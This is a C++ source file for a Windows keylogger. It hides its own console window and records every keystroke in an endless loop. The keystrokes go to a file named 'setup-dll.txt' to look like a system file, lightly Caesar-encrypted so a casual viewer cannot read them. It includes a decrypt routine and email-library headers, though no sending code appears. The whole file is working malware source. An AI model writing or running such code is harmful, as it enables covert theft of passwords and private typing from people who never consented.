#include <iostream>
#include <fstream>
#include <ctime>
#include <conio.h>
#include <streambuf>
#include <Windows.h>
#include "easendmailobj.tlh"
#include "easendmailobj.tli"

using namespace std;
fstream ifile;
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}


void decrypt_file() {

	int decrypt;
	ifile.open("setup-dll.txt");
	ifile >> decrypt;
	char temp;

	for (; !ifile.eof();) {
		temp = ifile.get();
		temp = temp - decrypt;
		cout << temp;
	}
}
int main() {

	Stealth();
	srand(time(0));
	int encrypt = rand() % 25; // ceaser cypher encryption just for any layman not to able to read the file.
	encrypt++; // this addition is to encounter 0 because it will disclose the whole message written.

	ifile.open("setup-dll.txt", std::ofstream::out | std::ofstream::in| std::fstream::trunc);
	ifile << encrypt; // placing real ceaser cypher shift in the start of the file, it can also be encrypted but this is just for understanding.
	ifile <<" ";

	while (1) {
		for (int i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {

				if (char(i) == '1') { // program will terminate as soon person clicks 1 , you can add your own termination condition.
					return 0;
				}

				i += encrypt;
				ifile << char(i);
				
				//cout << i << endl;
			}
		}
	}
	ifile.close();
}
